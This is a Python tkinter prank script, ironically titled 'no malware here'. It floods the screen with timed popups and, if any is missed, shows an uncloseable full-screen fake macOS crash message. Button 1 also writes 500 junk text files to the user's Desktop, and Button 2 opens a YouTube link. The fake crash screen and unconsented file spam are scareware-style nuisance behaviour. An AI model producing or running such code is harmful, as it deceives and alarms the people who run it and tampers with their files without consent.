import tkinter as tk
import webbrowser
import os

root = tk.Tk()
root.title("no malware here")

def start_virus_defender(parent):
    popups = []
    popup_count = 25
    popup_timeout = 5000  # time before error screen in ms
    clicked = [False] * popup_count
    crashed = [False]

    def show_crash_screen():
        if crashed[0]:
            return
        crashed[0] = True

        for popup in popups:
            try:
                popup.destroy()
            except:
                pass

        crash = tk.Toplevel(parent)
        crash.overrideredirect(True)
        crash.geometry(f"{parent.winfo_screenwidth()}x{parent.winfo_screenheight()}+0+0")
        crash.configure(bg="black")
        crash.lift()
        crash.focus_force()
        crash.protocol("WM_DELETE_WINDOW", lambda: None)
        crash.bind("<Escape>", lambda e: None)

        msg = (
            "Your computer restarted because of a problem.\n\n"
            "Press a key or wait a few seconds to continue starting up.\n\n"
            "Votre ordinateur a redémarré en raison d’un problème.\n\n"
            "按下任意键或等待几秒钟以继续启动。\n\n"
            "Mac OS Sequoia"
        )
        label = tk.Label(crash, text=msg, fg="white", bg="black", font=("Helvetica", 24), justify="center")
        label.pack(expand=True)

        crash.bind("<Key>", lambda e: crash.destroy())

    def popup_action(idx, popup):
        def on_click():
            if crashed[0]:
                return
            clicked[idx] = True
            popup.destroy()
            if all(clicked):
                print("You closed all the popups in time!")

        popup.protocol("WM_DELETE_WINDOW", lambda: None)
        btn = tk.Button(popup, text=f"evil virus popup {idx + 1}", font=("Arial", 16), command=on_click)
        btn.pack(expand=True)

    def show_popup(idx):
        if crashed[0]:
            return

        popup = tk.Toplevel(parent)
        popup.title(f"Popup {idx + 1}")
        popup.geometry("175x50")
        popup_action(idx, popup)
        popups.append(popup)

        def check_timeout():
            if not clicked[idx] and not crashed[0]:
                print(f"You were too slow for popup {idx + 1}!")
                show_crash_screen()

        parent.after(popup_timeout, check_timeout)

    for i in range(popup_count):
        parent.after(i * 700, lambda idx=i: show_popup(idx))

def open_new_window():
    new_window = tk.Toplevel(root)
    new_window.title("Viruses are invading your computer!")
    tk.Label(new_window, text="my whole purpouse is to slow you down from clicking the popups").pack()
    start_virus_defender(new_window)

def button_click_1():
    print("Button 1 clicked!")
    open_new_window()

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    num_times = 500  # number of files to create

    for i in range(num_times):
        numbered_file_path = os.path.join(desktop_path, f"my information now_{i+1}.txt")
        with open(numbered_file_path, 'w') as file:
            file.write("You've been distracted, and now these files are here!")
        print(f"File '{numbered_file_path}' created successfully, dum dum. ({i+1}/{num_times})")

def button_click_2():
    print("HAHA")
    webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")

button1 = tk.Button(root, text="Button 1", command=button_click_1)
button2 = tk.Button(root, text="Button 2", command=button_click_2)

button1.pack(pady=10)
button2.pack(pady=10)

root.mainloop()